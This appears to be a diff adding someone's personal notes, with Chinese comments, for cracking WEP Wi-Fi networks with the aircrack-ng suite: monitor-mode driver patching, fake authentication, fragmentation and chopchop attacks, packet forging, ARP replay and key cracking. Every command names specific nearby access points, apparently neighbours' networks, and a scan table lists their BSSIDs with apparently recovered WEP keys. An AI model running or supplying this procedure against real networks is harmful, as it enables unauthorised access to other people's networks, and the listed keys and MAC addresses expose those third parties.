@@ -1,0 +1,366 @@
+
+info
+
+
+AP MAC:00:1F:1F:0E:6D:4D
+
+
+ESSID:Vdragon
+
+
+card mac:00:0E:2E:B3:A9:5A
+
+
+
+
+
+
+
+
+
+
+ CH  8 ][ Elapsed: 24 s ][ 2009-06-15 07:44                                    
+
+
+                                                                               
+
+
+ BSSID                        PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH   ESSID   Key
+
+
+                                                                               
+
+
+ 00:1F:1F:0E:6D:4D     107       17            0      0    11  54  WEP    WEP              Vdragon 0123456789
+
+
+ 00:0A:79:AA:DE:80      98        20            0      0     1  54.  WEP    WEP             corega  2627F68597
+
+
+ 00:1C:F0:B7:57:DF      98         3             0      0    11  54. WEP    WEP       ChiayuWu      ButinWa AB19820303
+
+
+ 00:1E:8C:71:AC:24      96         5            0      0      1  48   WEP    WEP              etoe    A123456789
+
+
+ 00:1E:8C:71:AC:24  -79  92      709       69    0   1  54   WEP  WEP    OPN  default                                                                                      
+
+
+ BSSID              STATION            PWR   Rate  Lost  Packets  Probes       
+
+
+                                                                               
+
+
+
+
+/*最麻煩的應該是這個＠＠把無線網卡晶片的驅動改成可以聽所有封包的*/
+/*這個要看網卡是什麼晶片，去AIRCRACK-NG網站查看如何修改*/
+/*我的是rt73這個晶片就是了...*/
+patch driver
+
+
+patch -Np2 -i rt73_2.6.27.patch
+
+
+patch -Np0 -i rt73_2.6.27.patch
+
+
+patch place:parent of /rt73-k2wrlz-3.0.1
+
+
+
+
+/*調整無線網卡的使用頻寬跟頻道（可省略）*/
+/*基本上頻寬越低接收範圍越廣的樣子*/
+change rate/channel
+
+
+iwconfig wlan0 rate 1MB
+
+
+iwconfig wlan0 rate 54MB
+
+
+iwconfig wlan0 channel 1
+
+
+iwconfig wlan0 channel 11
+
+
+
+
+/*啟動／關閉無線網卡聽取封包模式*/
+/*最後一個參數是固定無線網路頻道（可省略）*/
+Monitor mode
+
+
+airmon-ng start wlan0
+
+
+airmon-ng start wlan0 1
+
+
+airmon-ng start wlan0 11
+
+
+airmon-ng stop wlan0
+
+
+
+
+/*airodump只接裝置名稱的時候可以查看附近的AP等資訊（找下手目標？）*/
+find ap
+
+
+airodump-ng wlan0
+
+
+airodump-ng --channel 1 wlan0
+
+
+airodump-ng --channel 11 wlan0
+
+
+
+
+/*試圖注入封包，理論上只要訊號夠強應該要成功＠＠*/
+/*以下的mac皆為網卡MAC或者ap的BSSID*/
+injection test
+
+
+aireplay-ng -9 wlan0
+
+
+aireplay-ng -9 -e Vdragon -a 00:1F:1F:0E:6D:4D mon0
+
+
+aireplay-ng -9 -e etoe -a 00:1E:8C:71:AC:24 wlan0
+
+
+aireplay-ng -9 -e corega -a 00:0A:79:AA:DE:80 wlan0
+
+
+aireplay-ng -9 -e ButinWa -a 00:1C:F0:B7:57:DF wlan0
+
+
+aireplay-ng -9 -e default -a 00:1E:8C:71:AC:24 wlan0
+
+
+aireplay-ng -9 -e BABA -a 00:0E:2E:40:0A:BC mon0
+
+
+aireplay-ng -9 -e Lin's -a 80:1F:02:26:88:39 mon0
+
+
+80:1F:02:26:88:39
+
+
+/*欺騙AP使自己的網卡authenticated*/
+make fake auth
+
+
+aireplay-ng --fakeauth 0 -e private_AP -a 00:1F:1F:0E:6D:4D -h 00:90:cc:f9:d2:8c wlan0
+
+
+aireplay-ng --fakeauth 0 -e etoe -a 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng --fakeauth 0 -e corega -a 00:0A:79:AA:DE:80 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng --fakeauth 0 -e ButinWa -a 00:1C:F0:B7:57:DF -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng --fakeauth 0 -e default -a 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng --fakeauth 0 -e BABA -a 00:0E:2E:40:0A:BC -h 00:90:cc:f9:d2:8c mon0
+
+
+/*略*/
+send ARP
+
+
+aireplay-ng -3 -e Vdragon -b 00:1F:1F:0E:6D:4D -h 00:0E:2E:B3:A9:5A wlan0
+
+
+
+
+/*以下是幾種攻擊方式，目的是要獲取可以製造進行ARP攻擊的封包*/
+fragment
+
+
+aireplay-ng -5 -b 00:1F:1F:0E:6D:4D -h 00:90:cc:f9:d2:8c wlan0
+
+
+aireplay-ng -5 -b 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -5 -b 00:0A:79:AA:DE:80 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -5 -b 00:1C:F0:B7:57:DF -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -5 -b 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+
+
+
+
+chopchop
+
+
+aireplay-ng -4 -b 00:1F:1F:0E:6D:4D -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -4 -b 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -4 -b 00:0A:79:AA:DE:80 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -4 -b 00:1C:F0:B7:57:DF -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -4 -b 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+
+
+
+
+chopchop without associate
+
+
+aireplay-ng -4 -b 00:1E:8C:71:AC:24 wlan0
+
+
+
+
+
+
+caffe latte
+
+
+aireplay-ng -5 -b 00:1F:1F:0E:6D:4D -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -5 -b 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -5 -b 00:0A:79:AA:DE:80 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -5 -b 00:1C:F0:B7:57:DF -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -5 -b 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+
+
+/*略*/
+resend
+
+
+aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:1F:1F:0E:6D:4D -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:0A:79:AA:DE:80 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:1C:F0:B7:57:DF -h 00:0E:2E:B3:A9:5A wlan0
+
+
+aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A wlan0
+
+
+
+
+/*利用上述攻擊產生的檔案製作ARP攻擊的封包的樣子*/
+packet forge
+
+
+packetforge-ng -0 -a 00:1F:1F:0E:6D:4D -h 00:0E:2E:B3:A9:5A -k 255.255.255.255 -l 255.255.255.255 -y fragment-0328-132551.xor -w Vdragon-arp-request
+
+
+packetforge-ng -0 -a 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A -k 255.255.255.255 -l 255.255.255.255 -y fragment-0328-131959.xor -w etoe-arp-request
+
+
+packetforge-ng -0 -a 00:0A:79:AA:DE:80 -h 00:0E:2E:B3:A9:5A -k 255.255.255.255 -l 255.255.255.255 -y fragment-0731-235907.xor -w corega-arp-request
+
+
+packetforge-ng -0 -a 00:1C:F0:B7:57:DF -h 00:0E:2E:B3:A9:5A -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-0625-135621.xor -w ButinWa-arp-request
+
+
+packetforge-ng -0 -a 00:1E:8C:71:AC:24 -h 00:0E:2E:B3:A9:5A -k 255.255.255.255 -l 255.255.255.255 -y fragment-0321-214410.xor -w default-arp-request
+
+
+
+
+/*這一次不是要看ap了，而是要在ARP攻擊時dump出可以拿來破解key的封包*/
+dump
+
+
+airodump-ng -c 11 --bssid 00:1F:1F:0E:6D:4D -w Vdragon_output wlan0
+
+
+airodump-ng -c 1 --bssid 00:1E:8C:71:AC:24 -w etoe_output wlan0
+
+
+airodump-ng -c 1 --bssid 00:0A:79:AA:DE:80 -w corega_output wlan0
+
+
+airodump-ng -c 11 --bssid 00:1C:F0:B7:57:DF -w ButinWa_output wlan0
+
+
+airodump-ng -c 1 --bssid 00:1E:8C:71:AC:24 -w default_output wlan0
+
+
+
+
+/*開始發送ARP攻擊，理論上dump下來的封包至少要30000個以上破解key才有成功率*/
+/*如果程式當了請重新執行*/
+interactive arp
+
+
+aireplay-ng -2 -r Vdragon-arp-request wlan0
+
+
+aireplay-ng -2 -r etoe-arp-request wlan0
+
+
+aireplay-ng -2 -r corega-arp-request wlan0
+
+
+aireplay-ng -2 -r ButinWa-arp-request wlan0
+
+
+aireplay-ng -2 -r default-arp-request wlan0
+
+
+
+
+/*將dump出來的資料破解，如果成功key就出來了*/
+crack
+
+
+aircrack-ng -z -b 00:1f:1f:0e:6d:4d Vdragon_output-*.cap
+
+
+aircrack-ng -z -b 00:1E:8C:71:AC:24 etoe_output-*.cap
+
+
+aircrack-ng -z -b 00:0A:79:AA:DE:80 corega_output-*.cap
+
+
+aircrack-ng -z -b 00:1C:F0:B7:57:DF ButinWa_output-*.cap
+
+
+aircrack-ng -z -b 00:1E:8C:71:AC:24 default_output-*.cap
